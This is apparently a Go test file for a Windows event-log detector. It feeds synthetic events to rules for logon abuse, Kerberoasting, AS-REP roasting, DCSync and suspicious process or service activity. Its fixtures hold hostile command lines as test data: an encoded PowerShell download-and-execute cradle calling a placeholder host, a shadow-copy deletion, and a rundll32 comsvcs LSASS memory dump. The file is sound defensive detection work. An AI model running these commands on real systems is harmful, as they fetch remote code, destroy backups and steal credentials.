package agent

import (
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"strings"
	"testing"
	"unicode/utf16"

	"safe/internal/model"
)

// winXML 按 Windows 事件日志 API 渲染的格式构造一条事件。
func winXML(channel string, id int, record uint64, data map[string]string) string {
	var b strings.Builder
	fmt.Fprintf(&b, `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>`+
		`<Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/>`+
		`<EventID>%d</EventID><Version>2</Version><Level>0</Level><Task>12544</Task>`+
		`<TimeCreated SystemTime='2026-11-01T08:00:00.1234567Z'/><EventRecordID>%d</EventRecordID>`+
		`<Channel>%s</Channel><Computer>DC01.corp.example</Computer><Security/></System><EventData>`, id, record, channel)
	for k, v := range data {
		fmt.Fprintf(&b, `<Data Name='%s'>`, k)
		xml.EscapeText(&b, []byte(v))
		b.WriteString(`</Data>`)
	}
	b.WriteString(`</EventData></Event>`)
	return b.String()
}

func evalWin(t *testing.T, d *winDetector, xmls ...string) []model.HostEvent {
	t.Helper()
	evs, err := ParseWinEvents(strings.NewReader(strings.Join(xmls, "\r\n")))
	if err != nil || len(evs) != len(xmls) {
		t.Fatalf("parse: %d events, %v", len(evs), err)
	}
	var out []model.HostEvent
	for _, e := range evs {
		out = append(out, d.Evaluate(e)...)
	}
	return out
}

func TestParseWinEventsUserData(t *testing.T) {
	// 1102 的字段在 UserData 下
	x := `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Eventlog'/>` +
		`<EventID>1102</EventID><TimeCreated SystemTime='2026-11-01T08:00:00Z'/><EventRecordID>77</EventRecordID>` +
		`<Channel>Security</Channel><Computer>WEB01</Computer></System><UserData>` +
		`<LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'>` +
		`<SubjectUserSid>S-1-5-21-1-2-3-500</SubjectUserSid><SubjectUserName>Administrator</SubjectUserName>` +
		`<SubjectDomainName>CORP</SubjectDomainName><SubjectLogonId>0x3e7</SubjectLogonId></LogFileCleared></UserData></Event>`
	evs, err := ParseWinEvents(strings.NewReader(x))
	if err != nil || len(evs) != 1 || evs[0].RecordID != 77 || evs[0].Data["SubjectUserName"] != "Administrator" {
		t.Fatalf("parse: %+v %v", evs, err)
	}
	got := (&winDetector{}).Evaluate(evs[0])
	if len(got) != 1 || got[0].Severity != "high" || !strings.Contains(got[0].Detail, `CORP\Administrator`) {
		t.Errorf("log cleared: %+v", got)
	}
}

func TestWinLogonEvents(t *testing.T) {
	d := &winDetector{}
	got := evalWin(t, d,
		winXML("Security", 4625, 1, map[string]string{"TargetUserName": "admin", "TargetDomainName": "WEB01", "LogonType": "3",
			"IpAddress": "::ffff:10.0.0.66", "Status": "0xc000006d", "SubStatus": "0xc000006a"}),
		winXML("Security", 4624, 2, map[string]string{"TargetUserName": "ops", "TargetDomainName": "CORP", "LogonType": "10", "IpAddress": "10.0.0.5"}),
		winXML("Security", 4624, 3, map[string]string{"TargetUserName": "ops", "LogonType": "3", "IpAddress": "10.0.0.5",
			"AuthenticationPackageName": "NTLM", "LmPackageName": "NTLM V2"}),
		// 以下不上报：Kerberos 网络登录、机器账户、本机登录
		winXML("Security", 4624, 4, map[string]string{"TargetUserName": "ops", "LogonType": "3", "IpAddress": "10.0.0.5", "AuthenticationPackageName": "Kerberos"}),
		winXML("Security", 4624, 5, map[string]string{"TargetUserName": "WEB02$", "LogonType": "3", "IpAddress": "10.0.0.6", "AuthenticationPackageName": "NTLM"}),
		winXML("Security", 4624, 6, map[string]string{"TargetUserName": "ops", "LogonType": "10", "IpAddress": "127.0.0.1"}),
	)
	if len(got) != 3 {
		t.Fatalf("events: %+v", got)
	}
	if got[0].Type != model.EventLoginFailed || got[0].SrcIP != "10.0.0.66" || got[0].User != `WEB01\admin` {
		t.Errorf("4625: %+v", got[0])
	}
	if got[1].Type != model.EventLoginSuccess || got[1].Detail != "远程桌面登录" || got[2].Detail != "NTLM 网络登录（NTLM V2）" {
		t.Errorf("4624: %+v %+v", got[1], got[2])
	}

	// 新凭据登录（pass-the-hash 与 runas /netonly 相同）
	got = evalWin(t, d, winXML("Security", 4624, 7, map[string]string{"TargetUserName": "ops", "LogonType": "9",
		"LogonProcessName": "seclogo  ", "SubjectUserName": "ops", "ProcessName": `C:\Windows\System32\svchost.exe`}))
	if len(got) != 1 || got[0].Type != model.EventDomainAttack || got[0].Severity != "medium" {
		t.Errorf("logon type 9: %+v", got)
	}
}

func TestWinProcessAndAccountEvents(t *testing.T) {
	d := &winDetector{}
	enc := func(s string) string {
		u := utf16.Encode([]rune(s))
		b := make([]byte, 2*len(u))
		for i, c := range u {
			b[2*i], b[2*i+1] = byte(c), byte(c>>8)
		}
		return base64.StdEncoding.EncodeToString(b)
	}
	proc := func(rec uint64, image, cmd, parent string) string {
		return winXML("Security", 4688, rec, map[string]string{"NewProcessName": image, "CommandLine": cmd,
			"ParentProcessName": parent, "SubjectUserName": "IIS APPPOOL", "SubjectDomainName": "DefaultAppPool"})
	}
	got := evalWin(t, d,
		proc(10, `C:\Windows\System32\cmd.exe`, `cmd /c whoami`, `c:\windows\system32\inetsrv\w3wp.exe`),
		proc(11, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			`powershell -nop -w hidden -enc `+enc(`IEX (New-Object Net.WebClient).DownloadString('http://x/a')`), `C:\Windows\explorer.exe`),
		proc(12, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell.exe -EncodedCommand `+enc(`Get-Date`), `C:\x\agent.exe`),
		proc(13, `C:\Windows\System32\vssadmin.exe`, `vssadmin.exe Delete Shadows /All /Quiet`, `C:\Windows\System32\cmd.exe`),
		proc(14, `C:\Windows\System32\rundll32.exe`, `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\l.dmp full`, `C:\Windows\System32\cmd.exe`),
		proc(15, `C:\Windows\System32\cmd.exe`, `cmd.exe /c powershell`, `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`),
		// 正常：管理员自己运行 whoami、普通 PowerShell
		proc(16, `C:\Windows\System32\whoami.exe`, `whoami /all`, `C:\Windows\System32\cmd.exe`),
		proc(17, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -ExecutionPolicy Bypass -File C:\ops\backup.ps1`, `C:\Windows\explorer.exe`),
	)
	rules := map[string]string{}
	for _, e := range got {
		rules[e.Detail[1:strings.Index(e.Detail, "]")]] = e.Severity
	}
	want := map[string]string{"服务进程派生命令": "high", "下载并执行": "high", "编码的 PowerShell": "medium", "破坏备份": "high",
		"凭据窃取": "high", "Office 派生命令": "high"}
	for k, v := range want {
		if rules[k] != v {
			t.Errorf("rule %s: got %q (all: %v)", k, rules[k], rules)
		}
	}
	if len(got) != len(want) {
		t.Errorf("unexpected findings: %v", rules)
	}
	if !d.execSeen {
		t.Error("4688 did not mark exec monitoring as active")
	}

	got = evalWin(t, d,
		winXML("Security", 4720, 20, map[string]string{"TargetUserName": "backdoor", "TargetDomainName": "WEB01", "SubjectUserName": "Administrator"}),
		winXML("Security", 4732, 21, map[string]string{"TargetSid": "S-1-5-32-544", "TargetUserName": "Administrators",
			"MemberSid": "S-1-5-21-1-2-3-1001", "MemberName": "-", "SubjectUserName": "Administrator"}),
		winXML("Security", 4728, 22, map[string]string{"TargetSid": "S-1-5-21-1-2-3-512", "TargetUserName": "Domain Admins",
			"MemberName": "CN=svc,CN=Users,DC=corp", "SubjectUserName": "helpdesk"}),
		winXML("Security", 4732, 23, map[string]string{"TargetSid": "S-1-5-21-1-2-3-1105", "TargetUserName": "App Users", "MemberName": "x"}),
	)
	if len(got) != 3 || got[0].Severity != "medium" || got[1].Severity != "high" ||
		!strings.Contains(got[1].Detail, "S-1-5-21-1-2-3-1001 被加入特权组 Administrators") || !strings.Contains(got[2].Detail, "Domain Admins") {
		t.Errorf("account changes: %+v", got)
	}
}

func TestWinServiceInstall(t *testing.T) {
	d := &winDetector{}
	svc := func(rec uint64, name, image string) string {
		return winXML("System", 7045, rec, map[string]string{"ServiceName": name, "ImagePath": image, "AccountName": "LocalSystem"})
	}
	got := evalWin(t, d,
		svc(1, "PSEXESVC", `%SystemRoot%\PSEXESVC.exe`),
		svc(2, "BTOBTO", `%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat`),
		svc(3, "upd", `C:\Users\Public\upd.exe`),
		svc(4, "MySQL80", `"C:\Program Files\MySQL\MySQL Server 8.0\bin\mysqld.exe" --defaults-file="C:\ProgramData\MySQL\my.ini" MySQL80`),
	)
	if len(got) != 4 || got[3].Type != model.EventCommand {
		t.Fatalf("services: %+v", got)
	}
	for _, e := range got[:3] {
		if e.Type != model.EventSuspiciousCommand || e.Severity != "high" {
			t.Errorf("suspicious service not flagged: %+v", e)
		}
	}
}

func TestDomainControllerDetections(t *testing.T) {
	d := &winDetector{}
	tgs := func(rec uint64, svc, enc string) string {
		return winXML("Security", 4769, rec, map[string]string{"TargetUserName": "alice@CORP.EXAMPLE", "ServiceName": svc,
			"TicketEncryptionType": enc, "Status": "0x0", "IpAddress": "::ffff:10.0.0.66"})
	}
	// AES 票据、机器账户、krbtgt 不计入；第 3 个不同的 RC4 服务票据触发，之后 30 分钟内不再重复
	got := evalWin(t, d, tgs(1, "svc_sql", "0x17"), tgs(2, "svc_sql", "0x17"), tgs(3, "svc_web", "0x12"),
		tgs(4, "FILE01$", "0x17"), tgs(5, "krbtgt", "0x17"), tgs(6, "svc_web", "0x17"))
	if len(got) != 0 {
		t.Fatalf("kerberoast fired early: %+v", got)
	}
	got = evalWin(t, d, tgs(7, "svc_backup", "0x17"), tgs(8, "svc_crm", "0x17"))
	if len(got) != 1 || got[0].SrcIP != "10.0.0.66" || !strings.Contains(got[0].Detail, "3 个服务的票据：svc_backup、svc_sql、svc_web") {
		t.Fatalf("kerberoast: %+v", got)
	}

	got = evalWin(t, d,
		winXML("Security", 4768, 10, map[string]string{"TargetUserName": "legacy", "PreAuthType": "0", "Status": "0x0", "IpAddress": "10.0.0.66"}),
		winXML("Security", 4768, 11, map[string]string{"TargetUserName": "legacy", "PreAuthType": "0", "Status": "0x0", "IpAddress": "10.0.0.66"}),
		winXML("Security", 4768, 12, map[string]string{"TargetUserName": "bob", "PreAuthType": "2", "Status": "0x0"}),
	)
	if len(got) != 1 || !strings.Contains(got[0].Detail, "AS-REP") {
		t.Errorf("as-rep roasting: %+v", got)
	}

	repl := func(rec uint64, subject string) string {
		return winXML("Security", 4662, rec, map[string]string{"SubjectUserName": subject, "SubjectDomainName": "CORP",
			"Properties": "%%7688\n\t\t{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}"})
	}
	got = evalWin(t, d, repl(20, "DC02$"), repl(21, "alice"))
	if len(got) != 1 || got[0].Severity != "high" || !strings.Contains(got[0].Detail, `[DCSync] 非域控账户 CORP\alice`) {
		t.Errorf("dcsync: %+v", got)
	}
}
